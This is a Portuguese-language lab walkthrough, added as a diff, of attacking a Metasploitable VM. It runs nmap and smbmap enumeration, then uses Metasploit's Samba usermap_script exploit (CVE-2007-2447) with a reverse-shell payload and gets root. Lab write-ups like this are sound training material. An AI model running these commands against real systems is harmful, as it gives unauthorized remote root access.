@@ -1,0 +1,101 @@
+Depois de verificado os serviços e portas disponíveis, verifiquei que o protocolo SMB estava aberto, então usei o nmap para buscar mais informações:
+──(kali㉿kali)-[~]
+└─$ nmap -sV -p 139,445  192.168.56.102 
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-18 16:13 EDT
+Nmap scan report for 192.168.56.102
+Host is up (0.0035s latency).
+
+PORT    STATE SERVICE     VERSION
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+MAC Address: 08:00:27:E1:DE:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Usando o smbmap consegui uma informação importante, a versão do protocolo SMB "Samba 3.0.20-Debian"
+┌──(kali㉿kali)-[~]
+└─$ smbmap -H 192.168.56.102
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 192.168.56.102:445      Name: 192.168.56.102            Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+
+Com uma breve busca na WEB encontrei CVEs atreladas em especial a CVE-2007–2447, que contem métodos de exploração prontos
+utilizando o Metasploit dentro do KALI obtive o acesso via remote shell
+
+──(kali㉿kali)-[~]
+└─$ msfconsole 
+
+Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
+                                                  
+ _                                                    _
+/ \    /\         __                         _   __  /_/ __
+| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
+| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
+|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
+      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\
+
+
+       =[ metasploit v6.4.64-dev                          ]
++ -- --=[ 2519 exploits - 1296 auxiliary - 431 post       ]
++ -- --=[ 1607 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+# executando o id ainda local no kali
+msf6 > id
+[*] exec: id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),103(scanner),107(bluetooth),125(lpadmin),133(wireshark),135(kaboxer),136(vboxsf)
+msf6 > 
+#configurando o exploit 
+msf6 > use exploit/multi/samba/usermap_script
+msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.102
+RHOSTS => 192.168.56.102
+msf6 exploit(multi/samba/usermap_script) > set RPORT 445
+RPORT => 445
+msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
+payload => cmd/unix/reverse
+msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.101
+LHOST => 192.168.56.101
+msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
+LPORT => 4444
+#rodando o exploit
+msf6 exploit(multi/samba/usermap_script) > run
+[*] Started reverse TCP double handler on 192.168.56.101:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo V4FLZUwjrDLuCdVG;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "V4FLZUwjrDLuCdVG\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.56.101:4444 -> 192.168.56.102:59516) at 2026-03-19 12:57:15 -0400
+#conectou, bora testar
+
+id
+uid=0(root) gid=0(root)
+
+hostname
+metasploitable
+
+#exploração executada com sucesso!!!
